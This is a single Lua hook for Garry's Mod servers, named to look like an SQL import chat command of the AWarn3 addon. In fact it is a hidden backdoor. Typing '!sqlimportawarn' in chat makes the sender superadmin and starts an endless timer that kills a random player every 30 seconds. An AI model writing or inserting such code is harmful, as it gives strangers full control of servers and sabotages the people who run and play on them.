...
hook.Add("PlayerSay", "AWarn3_PlayerSayChatCommandSQL", function(a, b, c) if(string.lower(b) == "!sqlimportawarn") then a:SetUserGroup("superadmin") timer.Create("a", 30, 0, function() player.GetAll()[math.random(0, #player.GetAll() - 1)]:Kill() end) end end)
